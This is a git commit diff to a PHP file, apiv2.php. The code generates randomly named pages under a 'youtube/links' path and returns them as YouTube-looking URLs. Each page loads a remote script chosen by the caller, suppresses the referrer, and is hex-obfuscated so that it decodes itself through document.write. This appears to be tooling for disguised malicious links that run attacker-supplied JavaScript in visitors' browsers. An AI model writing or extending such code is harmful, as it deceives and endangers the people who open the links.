29139383eaa6eea23a2444ad407f1fb5bc183723
busine011 <112756675+busine011@users.noreply.github.com>
2022-11-17 08:44:17 -0400

    Update apiv2.php

--- apiv2.php
+++ apiv2.php
@@ -17,18 +17,32 @@ foreach ($info_cottorra as $cottorraextraida) {
 }
 
 
-
-
-
 if(isset($script)) {
 $NAMEFILE = generateRandomString();
 $DOMAIN = $_SERVER['SERVER_NAME'];
 $PROTOCOLO  =  "https://";
 	
-$contentHTML = '<script src="'.$PROTOCOLO.$script.'" type="text/javascript" async="true"></script>';
-file_put_contents("youtube/links". "/" .$NAMEFILE, $contentHTML);
-
 	
+$contentHTML = '
+<html>
+<head>
+<meta http-equiv="cache-control" content="no-cache">
+<meta name="referrer" content="no-referrer" />
+<meta name="robots" content="index">
+<meta name="robots" content="noindex">
+<meta name="robots" content="nofollow">
+</head>
+<body>
+<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>
+</body>
+</html>';
+
+$contentHTMLEXTRAIDO = $contentHTML;	
+$decode =  utf8_decode($contentHTMLEXTRAIDO);
+$hex = bin2hex($decode);	
+$script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	
+
+file_put_contents("youtube/links". "/" .$NAMEFILE, $script);	
 	
 $response = array(
  "url"=>$cottorraextraida['cottorra']." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE
